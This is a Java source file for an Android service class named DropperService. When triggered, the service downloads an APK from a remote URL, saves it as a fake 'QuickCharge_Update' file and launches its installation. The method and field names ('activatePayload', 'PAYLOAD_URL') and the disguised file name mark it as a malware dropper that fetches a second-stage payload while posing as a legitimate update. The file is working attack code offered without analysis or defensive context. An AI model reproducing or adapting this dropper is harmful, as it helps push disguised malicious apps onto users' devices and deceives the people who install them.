package com.phantom.reach;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.webkit.MimeTypeMap;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DropperService extends Service {
    private static final String PAYLOAD_URL = "https://cdn.yourdomain.com/phantom_reach.apk";
    
    public static void activatePayload(Context ctx) {
        Intent intent = new Intent(ctx, DropperService.class);
        ctx.startService(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                URL url = new URL(PAYLOAD_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.connect();
                
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!downloadDir.exists()) downloadDir.mkdirs();
                
                File apkFile = new File(downloadDir, "QuickCharge_Update_" + System.currentTimeMillis() + ".apk");
                
                InputStream in = conn.getInputStream();
                FileOutputStream out = new FileOutputStream(apkFile);
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                out.close();
                in.close();
                
                // Trigger install
                Intent installIntent = new Intent(Intent.ACTION_VIEW);
                installIntent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
                installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(installIntent);
                
                stopSelf();
            } catch (Exception e) {
                e.printStackTrace();
                stopSelf();
            }
        }).start();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}